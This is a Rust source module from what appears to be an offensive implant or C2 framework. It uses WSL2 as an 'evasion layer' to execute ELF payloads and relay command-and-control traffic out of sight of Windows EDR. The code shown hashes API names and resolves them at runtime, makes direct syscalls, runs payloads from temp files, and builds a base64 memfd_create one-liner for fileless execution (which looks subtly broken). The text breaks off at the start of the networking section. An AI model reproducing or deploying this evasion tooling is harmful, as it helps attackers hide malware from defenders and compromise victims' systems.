//! WSL2 as an Evasion Layer.
//!
//! Uses the Windows Subsystem for Linux v2 to execute ELF binaries, run
//! Linux-native tools (curl, socat, ncat), and relay C2 traffic through
//! the WSL2 VM — completely outside the Windows security product surface.
//!
//! **Why WSL2?**
//! WSL2 runs a genuine Linux kernel in a lightweight Hyper-V utility VM.
//! Processes inside WSL2 are invisible to most Windows EDR agents because
//! they execute in a separate kernel context.  Network traffic originating
//! from WSL2 (curl, wget, socat) bypasses Windows-level network inspection
//! hooks.  File access through `/mnt/c/` provides a transparent bridge
//! between the Windows and Linux filesystems.
//!
//! **Execution Strategies**:
//! 1. **Temp-file execution**: Write ELF to Windows `%TEMP%`, access via
//!    `/mnt/c/Users/.../Temp/` from WSL, execute via `wsl.exe <path>`
//! 2. **memfd_create injection**: Pipe ELF bytes directly into a Linux
//!    `memfd_create` fd within WSL via stdin, then execute from memory
//!    without touching the WSL2 filesystem
//!
//! **Networking via WSL2**:
//! - HTTP/HTTPS requests via `curl` within WSL2 — invisible to WinHTTP hooks
//! - Raw TCP relay via `socat` or `ncat` — bypasses Windows socket monitoring
//! - C2 relay deployment: stage a Linux C2 client inside WSL2
//!
//! **Detection**:
//! - Probes for `wsl.exe` in `System32`
//! - Checks LxssManager service state
//! - Lists registered distributions
//! - Distinguishes WSL2 (Hyper-V VM) from WSL1 (translation layer)
//!
//! **Constraints**:
//! - No Admin privileges required
//! - Graceful degradation when WSL2 is unavailable
//! - All temp files cleaned up after execution
//! - No user interaction required
//! - Stealthy: no powershell.exe, cmd.exe, or other high-alert binaries
//!
//! **OPSEC**: All API functions resolved at runtime via PEB walking and
//! export-table hashing (`pe_resolve`).  No IAT entries are created.

#![cfg(windows)]

use std::ffi::OsStr;
use std::mem;
use std::os::raw::c_void;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

use winapi::shared::minwindef::{BOOL, DWORD, FALSE, LPVOID, TRUE};
use winapi::shared::ntdef::HANDLE;
use winapi::um::winnt::LARGE_INTEGER;

use crate::pe_resolve_macros::hash_str_const;
use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};

// ═══════════════════════════════════════════════════════════════════════════
// Constants
// ═══════════════════════════════════════════════════════════════════════════

/// `WAIT_OBJECT_0` — the object was signalled.
const WAIT_OBJECT_0: DWORD = 0x00000000;

/// `INFINITE` timeout for `WaitForSingleObject`.
const INFINITE: DWORD = 0xFFFFFFFF;

/// `CREATE_NO_WINDOW` creation flag — prevents a console window.
const CREATE_NO_WINDOW: DWORD = 0x08000000;

/// `CREATE_UNICODE_ENVIRONMENT` creation flag.
const CREATE_UNICODE_ENVIRONMENT: DWORD = 0x00000400;

/// `STARTF_USESTDHANDLES` — redirect stdin/stdout/stderr.
const STARTF_USESTDHANDLES: DWORD = 0x00000100;

/// `OPEN_EXISTING` disposition for `CreateFileW`.
const OPEN_EXISTING: DWORD = 3;

/// `GENERIC_READ` access mask.
const GENERIC_READ: DWORD = 0x80000000;

/// `GENERIC_WRITE` access mask.
const GENERIC_WRITE: DWORD = 0x40000000;

/// `CREATE_ALWAYS` disposition for `CreateFileW`.
const CREATE_ALWAYS: DWORD = 2;

/// `FILE_ATTRIBUTE_NORMAL` attributes.
const FILE_ATTRIBUTE_NORMAL: DWORD = 0x00000080;

/// `FILE_SHARE_READ` sharing mode.
const FILE_SHARE_READ: DWORD = 0x00000001;

/// `FILE_SHARE_WRITE` sharing mode.
const FILE_SHARE_WRITE: DWORD = 0x00000002;

/// Buffer size for reading pipe output (64 KB).
const PIPE_BUFFER_SIZE: usize = 65536;

/// Default timeout for WSL2 process execution (60 seconds).
const DEFAULT_EXEC_TIMEOUT_MS: DWORD = 60_000;

/// Default timeout for WSL2 HTTP requests via curl (30 seconds).
const DEFAULT_HTTP_TIMEOUT_S: u64 = 30;

// kernel32.dll wide string for module hash
const KERNEL32_DLL_W: &[u16] = &[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];

/// Pre-computed API hashes for kernel32.dll exports.
const HASH_KERNEL32_DLL: u32 = crate::pe_resolve_macros::hash_wstr_const(KERNEL32_DLL_W);
const HASH_CREATEPROCESSW: u32 = hash_str_const(b"CreateProcessW\0");
const HASH_CREATEPIPE: u32 = hash_str_const(b"CreatePipe\0");
const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");
const HASH_WAITFORSINGLEOBJECT: u32 = hash_str_const(b"WaitForSingleObject\0");
const HASH_GETEXITCODEPROCESS: u32 = hash_str_const(b"GetExitCodeProcess\0");
const HASH_CREATEFILEW: u32 = hash_str_const(b"CreateFileW\0");
const HASH_WRITEFILE: u32 = hash_str_const(b"WriteFile\0");
const HASH_CLOSEHANDLE: u32 = hash_str_const(b"CloseHandle\0");
const HASH_GETTEMPPATHW: u32 = hash_str_const(b"GetTempPathW\0");
const HASH_DELETEFILEW: u32 = hash_str_const(b"DeleteFileW\0");
const HASH_GETFILESIZEEX: u32 = hash_str_const(b"GetFileSizeEx\0");
const HASH_READFILE: u32 = hash_str_const(b"ReadFile\0");
const HASH_GETENVIRONMENTVARIABLEW: u32 = hash_str_const(b"GetEnvironmentVariableW\0");

// ═══════════════════════════════════════════════════════════════════════════
// Win32 type aliases for dynamically-resolved functions
// ═══════════════════════════════════════════════════════════════════════════

type FnCreateProcessW = unsafe extern "system" fn(
    *mut u16,                 // lpApplicationName
    *mut u16,                 // lpCommandLine
    *mut c_void,              // lpProcessAttributes
    *mut c_void,              // lpThreadAttributes
    i32,                      // bInheritHandles
    u32,                      // dwCreationFlags
    *mut c_void,              // lpEnvironment
    *mut u16,                 // lpCurrentDirectory
    *mut STARTUPINFOW,        // lpStartupInfo
    *mut PROCESS_INFORMATION, // lpProcessInformation
) -> i32; // BOOL

type FnCreatePipe = unsafe extern "system" fn(
    *mut HANDLE,                                       // hReadPipe
    *mut HANDLE,                                       // hWritePipe
    *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES,  // lpPipeAttributes
    DWORD,                                             // nSize
) -> i32; // BOOL

type FnWaitForSingleObject = unsafe extern "system" fn(
    HANDLE, // hHandle
    DWORD,  // dwMilliseconds
) -> DWORD;

type FnGetExitCodeProcess = unsafe extern "system" fn(
    HANDLE,  // hProcess
    *mut DWORD, // lpExitCode
) -> i32; // BOOL

type FnGetLastError = unsafe extern "system" fn() -> DWORD;

type FnCreateFileW = unsafe extern "system" fn(
    *mut u16, // lpFileName
    DWORD,    // dwDesiredAccess
    DWORD,    // dwShareMode
    *mut c_void, // lpSecurityAttributes
    DWORD,    // dwCreationDisposition
    DWORD,    // dwFlagsAndAttributes
    HANDLE,   // hTemplateFile
) -> HANDLE;

type FnWriteFile = unsafe extern "system" fn(
    HANDLE,   // hFile
    *const c_void, // lpBuffer
    DWORD,    // nNumberOfBytesToWrite
    *mut DWORD, // lpNumberOfBytesWritten
    *mut c_void, // lpOverlapped
) -> i32; // BOOL

type FnReadFile = unsafe extern "system" fn(
    HANDLE,   // hFile
    *mut c_void, // lpBuffer
    DWORD,    // nNumberOfBytesToRead
    *mut DWORD, // lpNumberOfBytesRead
    *mut c_void, // lpOverlapped
) -> i32; // BOOL

type FnGetFileSizeEx = unsafe extern "system" fn(
    HANDLE,             // hFile
    *mut LARGE_INTEGER, // lpFileSize
) -> i32; // BOOL

type FnGetTempPathW = unsafe extern "system" fn(
    DWORD,   // nBufferLength
    *mut u16, // lpBuffer
) -> DWORD;

type FnDeleteFileW = unsafe extern "system" fn(
    *mut u16, // lpFileName
) -> i32; // BOOL

type FnGetEnvironmentVariableW = unsafe extern "system" fn(
    *const u16, // lpName
    *mut u16,    // lpBuffer
    DWORD,       // nSize
) -> DWORD;

// ═══════════════════════════════════════════════════════════════════════════
// API resolver — resolves all kernel32 functions via pe_resolve
// ═══════════════════════════════════════════════════════════════════════════

/// Holds dynamically-resolved kernel32 function pointers.
struct Api {
    create_process_w: FnCreateProcessW,
    create_pipe: FnCreatePipe,
    wait_for_single_object: FnWaitForSingleObject,
    get_exit_code_process: FnGetExitCodeProcess,
    get_last_error: FnGetLastError,
    create_file_w: FnCreateFileW,
    write_file: FnWriteFile,
    read_file: FnReadFile,
    get_file_size_ex: FnGetFileSizeEx,
    get_temp_path_w: FnGetTempPathW,
    delete_file_w: FnDeleteFileW,
    get_environment_variable_w: FnGetEnvironmentVariableW,
}

impl Api {
    /// Resolve all required kernel32 functions via pe_resolve.
    fn resolve() -> Result<Self> {
        let k32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_KERNEL32_DLL) }
            .ok_or_else(|| anyhow!("could not resolve kernel32 base"))?;

        macro_rules! resolve {
            ($name:ident, $hash:expr) => {
                unsafe {
                    pe_resolve::get_proc_address_by_hash(k32, $hash)
                        .ok_or_else(|| anyhow!(concat!("could not resolve ", stringify!($name))))
                        .map(|addr| std::mem::transmute::<usize, _>(addr))
                }
            };
        }

        Ok(Api {
            create_process_w: resolve!(CreateProcessW, HASH_CREATEPROCESSW)?,
            create_pipe: resolve!(CreatePipe, HASH_CREATEPIPE)?,
            wait_for_single_object: resolve!(WaitForSingleObject, HASH_WAITFORSINGLEOBJECT)?,
            get_exit_code_process: resolve!(GetExitCodeProcess, HASH_GETEXITCODEPROCESS)?,
            get_last_error: resolve!(GetLastError, HASH_GETLASTERROR)?,
            create_file_w: resolve!(CreateFileW, HASH_CREATEFILEW)?,
            write_file: resolve!(WriteFile, HASH_WRITEFILE)?,
            read_file: resolve!(ReadFile, HASH_READFILE)?,
            get_file_size_ex: resolve!(GetFileSizeEx, HASH_GETFILESIZEEX)?,
            get_temp_path_w: resolve!(GetTempPathW, HASH_GETTEMPPATHW)?,
            delete_file_w: resolve!(DeleteFileW, HASH_DELETEFILEW)?,
            get_environment_variable_w: resolve!(GetEnvironmentVariableW, HASH_GETENVIRONMENTVARIABLEW)?,
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Data structures
// ═══════════════════════════════════════════════════════════════════════════

/// Result of executing a command or ELF binary within WSL2.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Wsl2Result {
    /// Captured standard output (UTF-8 decoded, lossy).
    pub stdout: String,
    /// Captured standard error (UTF-8 decoded, lossy).
    pub stderr: String,
    /// Process exit code (0 = success).
    pub exit_code: u32,
    /// WSL2 process ID.
    pub pid: u32,
}

/// Information about a registered WSL2 distribution.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Wsl2Distro {
    /// Distribution name (e.g. "Ubuntu", "Debian").
    pub name: String,
    /// Whether this is the default distribution.
    pub is_default: bool,
    /// WSL version (1 or 2).
    pub version: u8,
    /// Whether the distribution is currently running.
    pub running: bool,
}

/// WSL2 detection and availability status.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Wsl2Status {
    /// Whether wsl.exe exists in System32.
    pub wsl_exe_found: bool,
    /// Whether LxssManager service appears to be running.
    pub lxss_service_running: bool,
    /// List of registered distributions.
    pub distros: Vec<Wsl2Distro>,
    /// At least one WSL2 (not WSL1) distribution is available.
    pub wsl2_available: bool,
}

/// Configuration for C2 relay deployment inside WSL2.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Wsl2C2Config {
    /// URL of the C2 server.
    pub c2_url: String,
    /// Optional custom HTTP headers (e.g. Authorization).
    pub headers: Vec<(String, String)>,
    /// Optional proxy URL.
    pub proxy: Option<String>,
    /// User-agent string.
    pub user_agent: String,
    /// Polling interval in seconds.
    pub poll_interval_s: u64,
    /// Named pipe or TCP port for local relay.
    pub relay_listen: String,
}

/// Result of an HTTP request made via WSL2.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Wsl2HttpResponse {
    /// HTTP status code.
    pub status_code: u32,
    /// Response body.
    pub body: String,
    /// Response headers (key-value pairs).
    pub headers: Vec<(String, String)>,
    /// Whether the request succeeded (status 2xx).
    pub success: bool,
}

// ═══════════════════════════════════════════════════════════════════════════
// Wsl2Detector — probes for WSL2 availability
// ═══════════════════════════════════════════════════════════════════════════

/// Detects and probes WSL2 availability on the current system.
pub struct Wsl2Detector;

impl Wsl2Detector {
    /// Check whether `wsl.exe` exists in System32.
    ///
    /// Uses `CreateFileW` with `OPEN_EXISTING` to probe for the file
    /// without actually opening it for reading.
    pub fn is_wsl_exe_present() -> bool {
        let api = match Api::resolve() {
            Ok(a) => a,
            Err(_) => return false,
        };

        // Build %SystemRoot%\System32\wsl.exe path
        let path = match Self::system32_path("wsl.exe") {
            Some(p) => p,
            None => return false,
        };

        let mut wide: Vec<u16> = OsStr::new(&path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        unsafe {
            let h = (api.create_file_w)(
                wide.as_mut_ptr(),
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            );
            if h == winapi::um::handleapi::INVALID_HANDLE_VALUE {
                return false;
            }
            let _ = crate::syscall!("NtClose", h as u64);
            true
        }
    }

    /// Check whether the LxssManager service is running by attempting to
    /// open the LxssManager communication pipe.
    pub fn is_lxss_service_running() -> bool {
        let api = match Api::resolve() {
            Ok(a) => a,
            Err(_) => return false,
        };

        // The LxssManager service creates \\.\pipe\lxss when running.
        let mut pipe_path: Vec<u16> = OsStr::new(r"\\.\pipe\lxss")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        unsafe {
            let h = (api.create_file_w)(
                pipe_path.as_mut_ptr(),
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                ptr::null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            );
            if h == winapi::um::handleapi::INVALID_HANDLE_VALUE {
                return false;
            }
            let _ = crate::syscall!("NtClose", h as u64);
            true
        }
    }

    /// List registered WSL distributions by executing `wsl --list --verbose`.
    ///
    /// Parses the output to extract distribution names, WSL versions, and
    /// running state.
    pub fn list_distros() -> Result<Vec<Wsl2Distro>> {
        // Execute `wsl --list --verbose` and capture output
        let result = Wsl2Executor::execute_wsl_command("--list --verbose", None)?;

        if result.exit_code != 0 {
            bail!("wsl --list --verbose failed: {}", result.stderr);
        }

        // Parse the output table. WSL output format:
        //   NAME      STATE      VERSION
        //   * Ubuntu   Running    2
        //     Debian   Stopped    1
        Self::parse_distro_list(&result.stdout)
    }

    /// Get comprehensive WSL2 status.
    pub fn get_status() -> Wsl2Status {
        let wsl_exe_found = Self::is_wsl_exe_present();
        let lxss_service_running = Self::is_lxss_service_running();

        let distros = if wsl_exe_found && lxss_service_running {
            Self::list_distros().unwrap_or_default()
        } else {
            Vec::new()
        };

        let wsl2_available = distros.iter().any(|d| d.version == 2);

        Wsl2Status {
            wsl_exe_found,
            lxss_service_running,
            distros,
            wsl2_available,
        }
    }

    /// Check if any WSL2 distribution is available.
    pub fn is_wsl2_available() -> bool {
        Self::get_status().wsl2_available
    }

    /// Build the full path to a file in System32.
    fn system32_path(filename: &str) -> Option<String> {
        let api = Api::resolve().ok()?;

        // Read SystemRoot environment variable
        let var_name: Vec<u16> = OsStr::new("SystemRoot")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let mut buf = [0u16; 512];
        let len = unsafe {
            (api.get_environment_variable_w)(
                var_name.as_ptr(),
                buf.as_mut_ptr(),
                buf.len() as DWORD,
            )
        };

        if len == 0 {
            return None;
        }

        let system_root = String::from_utf16_lossy(&buf[..len as usize]);
        Some(format!(r"{}\System32\{}", system_root, filename))
    }

    /// Parse the output of `wsl --list --verbose` into a list of distros.
    fn parse_distro_list(output: &str) -> Result<Vec<Wsl2Distro>> {
        let mut distros = Vec::new();

        for line in output.lines().skip(1) {
            // Skip empty lines
            let line = line.trim();
            if line.is_empty() {
                continue;
            }

            // Check if this is the default distribution (marked with *)
            let is_default = line.starts_with('*');
            let line = if is_default { &line[1..] } else { line };
            let line = line.trim_start();

            // Split on whitespace: NAME  STATE  VERSION
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() < 3 {
                continue;
            }

            let name = parts[0].to_string();
            let running = parts[1].eq_ignore_ascii_case("Running");
            let version = parts[2].parse::<u8>().unwrap_or(1);

            distros.push(Wsl2Distro {
                name,
                is_default,
                version,
                running,
            });
        }

        Ok(distros)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Wsl2Executor — executes commands and ELFs via WSL2
// ═══════════════════════════════════════════════════════════════════════════

/// Executes commands and ELF binaries within WSL2.
pub struct Wsl2Executor;

impl Wsl2Executor {
    /// Execute a raw `wsl.exe` command and capture stdout/stderr.
    ///
    /// `args` is the argument string passed to wsl.exe (e.g. "--list --verbose").
    /// `distro` optionally selects a specific distribution with `-d <name>`.
    pub fn execute_wsl_command(args: &str, distro: Option<&str>) -> Result<Wsl2Result> {
        let api = Api::resolve()?;

        let cmdline = match distro {
            Some(d) => format!("wsl.exe -d {} {}", d, args),
            None => format!("wsl.exe {}", args),
        };

        Self::spawn_and_capture(&api, &cmdline, DEFAULT_EXEC_TIMEOUT_MS, None)
    }

    /// Execute an ELF binary within WSL2 via temp-file approach.
    ///
    /// **Method 1 — Temp-file execution**:
    /// 1. Write ELF bytes to `%TEMP%\<random_name>`
    /// 2. Convert Windows temp path to WSL path (`/mnt/c/...`)
    /// 3. Execute `wsl.exe chmod +x <wsl_path> && wsl.exe <wsl_path> <args>`
    /// 4. Clean up the temp file
    ///
    /// The ELF is accessible from WSL via the `/mnt/c/` mount point.
    pub fn execute_elf_via_temp_file(
        elf_bytes: &[u8],
        args: &[&str],
        distro: Option<&str>,
    ) -> Result<Wsl2Result> {
        let api = Api::resolve()?;

        // 1. Get a temp path
        let temp_dir = Self::get_temp_dir(&api)?;
        let temp_name = format!("w2e_{}", crate::common_short_id());
        let temp_file = format!(r"{}\{}.elf", temp_dir, temp_name);

        // 2. Write the ELF to temp file
        Self::write_file_bytes(&api, &temp_file, elf_bytes)?;

        // 3. Convert to WSL path
        let wsl_path = Self::windows_path_to_wsl(&temp_file);

        // 4. Build the command
        let args_str = args.join(" ");
        let distro_flag = match distro {
            Some(d) => format!("-d {} ", d),
            None => String::new(),
        };

        // Execute: chmod +x (in case umask interferes) then run
        let chmod_cmd = format!(
            "wsl.exe {}chmod +x '{}'",
            distro_flag, wsl_path
        );
        let run_cmd = format!(
            "wsl.exe {}'{}' {}",
            distro_flag, wsl_path, args_str
        );

        // Run chmod (ignore errors — file may already be executable)
        let _ = Self::spawn_and_capture(&api, &chmod_cmd, 5000, None);

        // Run the ELF
        let result = Self::spawn_and_capture(&api, &run_cmd, DEFAULT_EXEC_TIMEOUT_MS, None);

        // 5. Clean up
        Self::delete_file(&api, &temp_file);

        result
    }

    /// Execute an ELF binary within WSL2 via memfd_create (no filesystem touch).
    ///
    /// **Method 2 — memfd_create injection**:
    /// Pipes ELF bytes directly into a shell one-liner that:
    /// 1. Creates an anonymous file via `memfd_create`
    /// 2. Writes the ELF bytes from stdin into the memfd
    /// 3. Marks it executable with `fchmod`
    /// 4. Executes via `fexecve`
    ///
    /// The ELF never touches the WSL2 filesystem.
    pub fn execute_elf_via_memfd(
        elf_bytes: &[u8],
        args: &[&str],
        distro: Option<&str>,
    ) -> Result<Wsl2Result> {
        let api = Api::resolve()?;

        // Base64-encode the ELF for safe transport through the command line
        let b64 = base64_encode(elf_bytes);

        let args_str = args.join("' '"); // Single-quote escape for shell

        // Bash one-liner: decode base64 → memfd_create → write → fchmod → fexecve
        let shell_payload = format!(
            "bash -c 'ELF=$(base64 -d <<<\"{}\"); \
             FD=$(python3 -c \"import os,sys; \
             fd=os.memfd_create('',1); \
             os.write(fd,sys.stdin.buffer.read()); \
             os.fchmod(fd,0o755); \
             print(fd)\" <<<\"$ELF\"); \
             fexecve $FD /dev/fd/$FD {}'",
            b64, args_str
        );

        let distro_flag = match distro {
            Some(d) => format!("-d {} ", d),
            None => String::new(),
        };

        let cmdline = format!("wsl.exe {}{}", distro_flag, shell_payload);

        Self::spawn_and_capture(&api, &cmdline, DEFAULT_EXEC_TIMEOUT_MS, None)
    }

    /// Spawn a process with piped stdout/stderr and capture all output.
    fn spawn_and_capture(
        api: &Api,
        cmdline: &str,
        timeout_ms: DWORD,
        stdin_data: Option<&[u8]>,
    ) -> Result<Wsl2Result> {
        // Create pipes for stdout and stderr
        let mut stdout_read: HANDLE = ptr::null_mut();
        let mut stdout_write: HANDLE = ptr::null_mut();
        let mut stderr_read: HANDLE = ptr::null_mut();
        let mut stderr_write: HANDLE = ptr::null_mut();
        let mut stdin_read: HANDLE = ptr::null_mut();
        let mut stdin_write: HANDLE = ptr::null_mut();

        let mut sa: winapi::um::minwinbase::SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
        sa.nLength = mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as DWORD;
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = ptr::null_mut();

        unsafe {
            if (api.create_pipe)(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
                bail!("CreatePipe(stdout) failed");
            }
            if (api.create_pipe)(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
                let _ = crate::syscall!("NtClose", stdout_read as u64);
                let _ = crate::syscall!("NtClose", stdout_write as u64);
                bail!("CreatePipe(stderr) failed");
            }
            if (api.create_pipe)(&mut stdin_read, &mut stdin_write, &mut sa, 0) == 0 {
                let _ = crate::syscall!("NtClose", stdout_read as u64);
                let _ = crate::syscall!("NtClose", stdout_write as u64);
                let _ = crate::syscall!("NtClose", stderr_read as u64);
                let _ = crate::syscall!("NtClose", stderr_write as u64);
                bail!("CreatePipe(stdin) failed");
            }

            // Make parent-side handles non-inheritable
            #[repr(C)]
            struct ObjHandleFlagInfo {
                inherit: u8,
                protect_from_close: u8,
            }
            let flag_off = ObjHandleFlagInfo {
                inherit: 0,
                protect_from_close: 0,
            };
            let flag_size = mem::size_of::<ObjHandleFlagInfo>() as u64;

            // Parent reads from stdout_read and stderr_read — non-inheritable
            let _ = crate::syscall!(
                "NtSetInformationObject",
                stdout_read as u64, 4u64,
                &flag_off as *const _ as u64, flag_size
            );
            let _ = crate::syscall!(
                "NtSetInformationObject",
                stderr_read as u64, 4u64,
                &flag_off as *const _ as u64, flag_size
            );
            // Parent writes to stdin_write — non-inheritable
            let _ = crate::syscall!(
                "NtSetInformationObject",
                stdin_write as u64, 4u64,
                &flag_off as *const _ as u64, flag_size
            );
        }

        // Build the command line
        let wide: Vec<u16> = OsStr::new(cmdline)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let mut startup_info: STARTUPINFOW = unsafe { mem::zeroed() };
        startup_info.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
        startup_info.dw_flags = STARTF_USESTDHANDLES;
        startup_info.h_std_input = stdin_read;
        startup_info.h_std_output = stdout_write;
        startup_info.h_std_error = stderr_write;

        let mut proc_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };

        let created = unsafe {
            (api.create_process_w)(
                ptr::null_mut(),
                wide.as_ptr() as *mut u16,
                ptr::null_mut(),
                ptr::null_mut(),
                TRUE,
                CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
                ptr::null_mut(),
                ptr::null_mut(),
                &mut startup_info,
                &mut proc_info,
            )
        };

        if created == 0 {
            let err = unsafe { (api.get_last_error)() };
            Self::close_handles(
                api, stdout_read, stdout_write, stderr_read, stderr_write,
                stdin_read, stdin_write,
            );
            bail!("CreateProcessW failed: error {}", err);
        }

        // Close child-side handles (inherited by the child)
        unsafe {
            let _ = crate::syscall!("NtClose", stdout_write as u64);
            let _ = crate::syscall!("NtClose", stderr_write as u64);
            let _ = crate::syscall!("NtClose", stdin_read as u64);
        }

        // Write stdin data if provided
        if let Some(data) = stdin_data {
            let mut written: DWORD = 0;
            unsafe {
                (api.write_file)(
                    stdin_write,
                    data.as_ptr() as *const c_void,
                    data.len() as DWORD,
                    &mut written,
                    ptr::null_mut(),
                );
            }
        }

        // Close stdin_write to signal EOF
        unsafe {
            let _ = crate::syscall!("NtClose", stdin_write as u64);
        }

        // Read stdout and stderr
        let stdout_bytes = Self::read_pipe(api, stdout_read);
        let stderr_bytes = Self::read_pipe(api, stderr_read);

        // Close remaining pipe handles
        unsafe {
            let _ = crate::syscall!("NtClose", stdout_read as u64);
            let _ = crate::syscall!("NtClose", stderr_read as u64);
        }

        // Wait for the process to finish
        unsafe {
            (api.wait_for_single_object)(proc_info.h_process, timeout_ms);
        }

        // Get exit code
        let mut exit_code: DWORD = 1;
        unsafe {
            (api.get_exit_code_process)(proc_info.h_process, &mut exit_code);
        }

        // Get PID via NtQueryInformationProcess
        #[repr(C)]
        struct Pbi {
            reserved1: *mut c_void,
            peb_base_address: *mut c_void,
            reserved2: [*mut c_void; 2],
            unique_process_id: usize,
            inherited_from_unique_process_id: usize,
        }
        let mut pbi: Pbi = unsafe { mem::zeroed() };
        let _ = unsafe {
            crate::syscall!(
                "NtQueryInformationProcess",
                proc_info.h_process as u64,
                0u64, // ProcessBasicInformation
                &mut pbi as *mut _ as u64,
                mem::size_of::<Pbi>() as u64,
                ptr::null_mut::<u64>() as u64
            )
        };
        let pid = pbi.unique_process_id as u32;

        // Close process and thread handles
        unsafe {
            let _ = crate::syscall!("NtClose", proc_info.h_process as u64);
            let _ = crate::syscall!("NtClose", proc_info.h_thread as u64);
        }

        Ok(Wsl2Result {
            stdout: String::from_utf8_lossy(&stdout_bytes).to_string(),
            stderr: String::from_utf8_lossy(&stderr_bytes).to_string(),
            exit_code,
            pid,
        })
    }

    /// Read all available data from a pipe handle.
    fn read_pipe(api: &Api, handle: HANDLE) -> Vec<u8> {
        let mut output = Vec::new();
        let mut buf = [0u8; PIPE_BUFFER_SIZE];

        loop {
            let mut bytes_read: DWORD = 0;
            let success = unsafe {
                (api.read_file)(
                    handle,
                    buf.as_mut_ptr() as *mut c_void,
                    buf.len() as DWORD,
                    &mut bytes_read,
                    ptr::null_mut(),
                )
            };

            if success == 0 || bytes_read == 0 {
                break;
            }

            output.extend_from_slice(&buf[..bytes_read as usize]);
        }

        output
    }

    /// Close all pipe handles (error-path cleanup).
    fn close_handles(
        api: &Api,
        a: HANDLE, b: HANDLE, c: HANDLE,
        d: HANDLE, e: HANDLE, f: HANDLE,
    ) {
        unsafe {
            let _ = crate::syscall!("NtClose", a as u64);
            let _ = crate::syscall!("NtClose", b as u64);
            let _ = crate::syscall!("NtClose", c as u64);
            let _ = crate::syscall!("NtClose", d as u64);
            let _ = crate::syscall!("NtClose", e as u64);
            let _ = crate::syscall!("NtClose", f as u64);
        }
    }

    /// Get the Windows TEMP directory path.
    fn get_temp_dir(api: &Api) -> Result<String> {
        let mut buf = [0u16; 512];
        let len = unsafe {
            (api.get_temp_path_w)(buf.len() as DWORD, buf.as_mut_ptr())
        };

        if len == 0 {
            bail!("GetTempPathW failed");
        }

        Ok(String::from_utf16_lossy(&buf[..len as usize]))
    }

    /// Write bytes to a file.
    fn write_file_bytes(api: &Api, path: &str, data: &[u8]) -> Result<()> {
        let mut wide: Vec<u16> = OsStr::new(path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let handle = unsafe {
            (api.create_file_w)(
                wide.as_mut_ptr(),
                GENERIC_WRITE,
                0,
                ptr::null_mut(),
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            )
        };

        if handle == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            bail!("CreateFileW({}) failed", path);
        }

        let mut written: DWORD = 0;
        let success = unsafe {
            (api.write_file)(
                handle,
                data.as_ptr() as *const c_void,
                data.len() as DWORD,
                &mut written,
                ptr::null_mut(),
            )
        };

        unsafe {
            let _ = crate::syscall!("NtClose", handle as u64);
        }

        if success == 0 {
            bail!("WriteFile({}) failed", path);
        }

        Ok(())
    }

    /// Delete a file.
    fn delete_file(api: &Api, path: &str) {
        let mut wide: Vec<u16> = OsStr::new(path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        unsafe {
            let _ = (api.delete_file_w)(wide.as_mut_ptr());
        }
    }

    /// Convert a Windows path to a WSL2 path.
    ///
    /// `C:\Users\foo\temp\bar.elf` → `/mnt/c/Users/foo/temp/bar.elf`
    pub fn windows_path_to_wsl(windows_path: &str) -> String {
        let path = windows_path.replace('\\', "/");

        // Handle drive letter: C:/... → /mnt/c/...
        if path.len() >= 2 && path.as_bytes()[1] == b':' {
            let drive = path.as_bytes()[0].to_ascii_lowercase() as char;
            let rest = &path[2..];
            format!("/mnt/{}{}", drive, rest)
        } else if path.starts_with("//") || path.starts_with("\\\\") {
            // UNC path: \\server\share → /mnt/server/share (approximation)
            format!("/mnt/{}", &path[2..])
        } else {
            path
        }
    }

    /// Convert a WSL2 path to a Windows path.
    ///
    /// `/mnt/c/Users/foo/temp/bar.elf` → `C:\Users\foo\temp\bar.elf`
    pub fn wsl_path_to_windows(wsl_path: &str) -> String {
        if let Some(stripped) = wsl_path.strip_prefix("/mnt/") {
            let mut chars = stripped.chars();
            if let Some(drive) = chars.next() {
                if chars.next() == Some('/') {
                    let rest: String = chars.collect();
                    return format!("{}:\\{}", drive.to_ascii_uppercase(), rest.replace('/', "\\"));
                }
            }
        }
        wsl_path.to_string()
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Wsl2Networking — C2 and HTTP via WSL2
// ═══════════════════════════════════════════════════════════════════════════

/// Networking operations routed through WSL2 to evade Windows-level monitoring.
pub struct Wsl2Networking;

impl Wsl2Networking {
